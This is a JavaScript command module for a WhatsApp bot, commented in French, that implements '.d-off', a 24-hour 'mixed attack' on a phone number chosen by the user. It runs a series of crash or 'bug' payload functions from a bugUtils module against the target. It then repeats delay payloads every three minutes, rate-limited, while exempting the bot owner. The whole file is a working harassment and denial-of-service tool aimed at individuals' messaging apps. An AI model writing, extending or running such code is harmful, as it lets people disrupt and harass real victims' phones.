const bugUtils = require("../../utils/bugUtils")
const { OWNER_NUM } = require("../../config")

// 🔥 stockage état
const activeOff = {}

module.exports = {
    name: "d-off",
    description: "Attaque mixte (24h)",
    usage: ".d-off <numéro>",

    async execute(sock, msg, args) {

        const remoteJid = msg.key.remoteJid
        const senderJid = msg.key.participant || remoteJid
        const q = args[0]

        // 🔥 STOP MANUEL (AJOUT)
        if (q === "off") {
            activeOff[remoteJid] = false

            return sock.sendMessage(remoteJid, {
                text: "🛑 D-OFF arrêté manuellement"
            }, { quoted: msg })
        }

        if (!q) {
            return sock.sendMessage(remoteJid, {
                text: `
╭╌╌❖ \`𝐃-𝐎𝐅𝐅\` ❖╌╌╌╌╌╌╌❍
╎➭ saisie bien l'attaque :
╎ \`𝐝-𝐨𝐟𝐟𝐟 237XXXXXXXX\`
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍
`
            }, { quoted: msg })
        }

        const number = q.replace(/[^0-9]/g, "")
        const target = number + "@s.whatsapp.net"

        if (
            target === OWNER_NUM + "@s.whatsapp.net" &&
            senderJid !== OWNER_NUM + "@s.whatsapp.net" &&
            !msg.key.fromMe
        ) {
            return sock.sendMessage(remoteJid, {
                text: `🚫 Vous ne pouvez pas utiliser cette commande contre le propriétaire du bot.`
            }, { quoted: msg })
        }

        await sock.sendMessage(remoteJid, {
            image: { url: "https://files.catbox.moe/mo7f1d.jpg" },
            caption: `
╭❍𓅃 𝐃-𝐎𝐅𝐅 𓅃❍╌╌╌╌╌╌╌╌❍
╎╭❖ 🎯 Cible  : ${number}
╎╰❖ 📌 Action : Progressif
╎╭❖ 🔄 Durée  : \`1 Jour\`
╎╰❖ 🔐 Protection : Anti-Spam 
╎
╎ \`Exécution en cours 📡…\`
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍

`
        }, { quoted: msg })

        const START = Date.now()
        const DURATION = 24 * 60 * 60 * 1000
        const ACTION_INTERVAL = 3 * 60 * 1000
        const MAX_PER_HOUR = 20

        let hourCount = 0
        let hourStart = Date.now()

        // 🔥 activation
        activeOff[remoteJid] = true

        try {
            await bugUtils.thunderblast_ios1(sock, target)
            await bugUtils.alldelay(sock, target)
            await bugUtils.callHome(sock, target)
            await bugUtils.carousels2(sock, target)
            await bugUtils.CarouselX(sock, target)
            await bugUtils.apaya(sock, target)

            // 🔥 while modifié (MINIME)
            while (activeOff[remoteJid] && Date.now() - START < DURATION) {

                if (Date.now() - hourStart >= 60 * 60 * 1000) {
                    hourCount = 0
                    hourStart = Date.now()
                }

                if (hourCount < MAX_PER_HOUR) {
                    await bugUtils.carouselDelay(sock, target)
                    await bugUtils.carouselDelay(sock, target)
                    hourCount += 2
                }

                await new Promise(r => setTimeout(r, ACTION_INTERVAL))
            }

            await sock.sendMessage(remoteJid, {
                text: `
╭╌╌╌❍\`𓅃 𝐑𝐀𝐏𝐏𝐎𝐑𝐓 𓅃\`❍╌╌❍
╎✎ Cycle 𝐉𝐨𝐮𝐫𝐧𝐚𝐥𝐢𝐞𝐫 𝐚𝐜𝐡𝐞𝐯𝐞́
╎✎ 𝐄𝐱𝐞́𝐜𝐮𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐛𝐢𝐥𝐢𝐬𝐞́
╎
╎🎯 𝐅𝐢𝐧𝐚𝐥𝐢𝐭𝐞́ 𝐝𝐞 𝐥'𝐞𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 : 𝐮𝐧𝐢𝐟𝐨𝐫𝐦𝐞
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍

`
            }, { quoted: msg })

        } catch (err) {
            console.error("⚠️ D-OFF interrompu :", err)

            await sock.sendMessage(remoteJid, {
                text: `⚠️ ⛔ 𝐀𝐑𝐑𝐄̂𝐓-𝐃 𝐎𝐅𝐅`
            }, { quoted: msg })
        }
    }
}